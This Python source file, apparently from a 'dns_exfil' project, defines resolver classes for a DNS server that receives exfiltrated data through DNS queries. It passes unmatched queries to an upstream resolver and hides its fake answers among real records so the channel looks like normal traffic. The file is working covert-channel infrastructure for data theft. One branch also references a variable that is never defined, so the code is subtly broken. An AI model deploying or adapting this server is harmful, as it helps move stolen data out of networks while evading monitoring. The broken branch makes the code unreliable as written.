import sys
from functools import wraps

from dns_exfil import config

import dnslib
from dnslib.server import DNSServer, BaseResolver
from dnslib.intercept import InterceptResolver

# The two classes defined here are raised when a subclass fails to define
# an exfiltration method for the query requested (RecordTypeNotDefined)
# or when the record type is defined but the query fails to exfiltrate
# acording to our protocol (CannotExfiltrateError). In both cases, the server
# should revert back to default behavior.
# Any other error that comes up, such as filesystem errors, etc. are caught
# and logged to stderr. It's not usually good to just catchall like this. whatever.

class RecordTypeNotDefined(Exception):
    pass

class CannotExfiltrateError(Exception):
    pass

def printerrors(func):
    @wraps(func)
    def wrapper(inst, request, handler):
        try:
            return func(inst, request, handler)
        except BaseException as e:
            message = '::- Server Error -:: '
            if len(e.args) > 0:
                message = message + str(e.args)
            sys.stderr.write(message)
            reply = request.reply()
            reply.header.rcode = dnslib.RCODE.SERVFAIL
            return reply
    return wrapper


class InterceptDefaultResolver(BaseResolver):
    '''
    If a record type is defined by a subclass, use that method to resovlve answers
    If not, pass the request up to the upstream server
    '''
    def __init__(self, cache_upstream = True):

        self.interceptor = InterceptResolver(**config['server']['upstream'])
        # link the piece of global config relevant to this instance
        context_name = type(self).__name__.lower()
        self.context = config['server'][context_name]
        self.use_upstream_cache = cache_upstream
        self.upstream_cache = {}
        super().__init__()

    def answer(self, qname, qtype):
        # The QTYPE bitmaps numerical record types to it's string value
        # For example, QTYPE[15] -> 'MX', and QTYPE.MX -> 15.
        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types
        # If a class has a method implemented by this name, we can use it
        # otherwise, we will just proxy the request upstream.
        try:
            query_resolver = getattr(self, dnslib.QTYPE[qtype])
            rdata_handler = getattr(dnslib, dnslib.QTYPE[qtype])
        except AttributeError:
            raise RecordTypeNotDefined
        question_name = str(qname)
        # Subclasses should raise CannotExfiltrateError. This should be raised,
        # for example, if the query is in the incorrect format or if the server
        # encounters some other kind of problem with the query.
        response = query_resolver(question_name)
        answer = dnslib.RR(question_name, qtype, rdata=rdata_handler(response), ttl=self.context['ttl'])
        return answer

    @printerrors
    def resolve(self, request, handler):
        try:
            reply = request.reply()
            reply.add_answer(self.answer(request.q.qname, request.q.qtype))
            return reply
        except (RecordTypeNotDefined, CannotExfiltrateError):
            if self.use_upstream_cache:
                reply = request.reply()
                try:
                    records = self.upstream_cache[(reply.q.qname, reply.q.qtype)]
                except KeyError:
                    upstream_response = self.interceptor.resolve(request, handler)
                    self.upstream_cache[(reply.q.qname, reply.q.qtype)] = upstream_response.rr
                    records = upstream_response.rr
                for record in records:
                    reply.add_answer(record)
                return reply
            else:
                return self.interceptor.resolve(request, handler)

class InterceptAppendResolver(InterceptDefaultResolver):
    '''
    Always resolve a request from upstream.
    If it's possible to answer a question, add the response at the end.
    '''
    def __init__(self):
        super().__init__()

    @printerrors
    def resolve(self, request, handler):
        qname = request.q.qname
        qtype = request.q.qtype
        try:
            answer = self.answer(qname, qtype)
            # We answered the question without an error, so we are exfiltrating successfully
            # When this happens, we want to proxy back the real domain name to get back real data
            # with our fake response inconspicuously at the end.
            real_domain_name = '.'.join(str(qname).split('.')[-3:])
            if self.use_upstream_cache:
                try:
                    real_records = self.upstream_cache[(real_domain_name, qtype)]
                except KeyError:
                    real_request = dnslib.DNSRecord()
                    real_request.add_question(dnslib.DNSQuestion(real_domain_name, qtype))
                    real_reply = self.interceptor.resolve(real_request, handler)
                    self.upstream_cache[(real_domain_name, qtype)] = real_reply.rr
                    real_records = real_reply.rr
            else:
                    real_reply = self.interceptor.resolve(real_request, handler)
                    real_records = real_reply.rr

            return_reply = request.reply()
            for record in real_records:
                return_reply.add_answer(record)
            return_reply.add_answer(answer)
        except (RecordTypeNotDefined, CannotExfiltrateError):
            # if we are here, we did not exfiltrate data.
            # Lets assume it's a real domain and just return a valid response
            return_reply = self.interceptor.resolve(request, handler)
        return return_reply

class FullRequestPassthroughResolver(InterceptDefaultResolver):
    def __init__(self):
        super().__init__()
        self.interceptor = InterceptResolver(**config['server']['upstream'])
    def process(self, request):
        '''override this'''
        pass
    @printerrors
    def resolve(self, request, handler):
        new_request = self.process(request)
        return self.interceptor.resolve(new_request, handler)

def start_server(resolver):
    server = DNSServer(resolver=resolver, **config['server']['service'])
    server.start()
